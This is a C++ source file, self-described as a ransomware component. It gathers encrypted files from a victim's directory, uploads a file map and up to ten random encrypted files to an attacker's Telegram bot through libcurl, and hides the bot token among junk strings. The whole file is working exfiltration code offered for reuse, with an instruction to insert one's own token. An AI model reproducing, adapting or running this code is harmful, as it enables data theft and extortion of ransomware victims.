// Developed by Colton Silva 2025
// version 1.0
//
// Categorized as RANSOMWARE
//
// This is a sub-file for selecting limited random files that are encrypted
// and then sending them into a created bot in telegram

#include <iostream>
#include <filesystem>
#include <vector>
#include <algorithm>
#include <random>
#include <chrono>
#include <curl/curl.h>

namespace fs = std::filesystem;
using namespace std;

// Obfuscated Telegram bot token, change it into your own token
const string junk1 = "238778346637578690283905992235";
const string part1 = "8022406930";
const string junk2 = "527289774364367543";
const string junk3 = "8252343554674345366786478";
const string part2 = ":AAH2xIXM";
const string junk4 = "SLd8xZxToPPc9_eThcXmPT";
const string part3 = "B34_WcjvmL";
const string junk5 = "LeIKa9IUCai7c2SkEelUx0";
const string part4 = "5uFPZSTo_7ZXBoJsk";

const string BOT_TOKEN = part1 + part2 + part3 + part4;
const string CHAT_ID = "6558072995"; // Your chat ID
const size_t MAX_SIZE = 50 * 1024 * 1024; // 50MB
const string MAP_FILE = "file_map.txt";  // Must be sent first

bool sendFileToTelegram(const string &filePath) {
    size_t fileSize = fs::file_size(filePath);
    if (fileSize > MAX_SIZE) {
        cerr << "[SKIP] >50MB: " << filePath << " (" << fileSize / (1024 * 1024) << " MB)\n";
        return false;
    }

    CURL *curl = curl_easy_init();
    if (!curl) return false;

    curl_mime *form = curl_mime_init(curl);
    curl_mimepart *field = nullptr;

    string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

    field = curl_mime_addpart(form);
    curl_mime_name(field, "chat_id");
    curl_mime_data(field, CHAT_ID.c_str(), CURL_ZERO_TERMINATED);

    field = curl_mime_addpart(form);
    curl_mime_name(field, "document");
    curl_mime_filedata(field, filePath.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);

    CURLcode res = curl_easy_perform(curl);
    bool ok = (res == CURLE_OK);
    if (!ok) cerr << "[FAIL] Send failed: " << filePath << "\n";

    curl_mime_free(form);
    curl_easy_cleanup(curl);
    return ok;
}

void sendRandomEncryptedFiles(const string &directory, int maxFiles = 10) {
    // Step 1: Send the file map first
    fs::path mapPath = fs::path(directory) / MAP_FILE;
    if (fs::exists(mapPath)) {
        cout << "[SEND] Sending file_map.txt first...\n";
        sendFileToTelegram(mapPath.string());
    } else {
        cerr << "[WARN] file_map.txt not found!\n";
    }

    // Step 2: Collect all "null*" encrypted files
    vector<fs::path> encryptedFiles;
    for (const auto &entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            string name = entry.path().filename().string();
            if (name.rfind("null", 0) == 0) {
                encryptedFiles.push_back(entry.path());
            }
        }
    }

    if (encryptedFiles.empty()) {
        cout << "[INFO] No encrypted files found.\n";
        return;
    }

    // Shuffle randomly
    auto rng = default_random_engine(chrono::system_clock::now().time_since_epoch().count());
    shuffle(encryptedFiles.begin(), encryptedFiles.end(), rng);

    // Step 3: Send up to `maxFiles` if under 50MB
    int sent = 0;
    for (const auto &file : encryptedFiles) {
        if (sendFileToTelegram(file.string())) {
            sent++;
            if (sent >= maxFiles) break;
        }
    }

    cout << "[DONE] Sent " << sent << " file(s).\n";
}
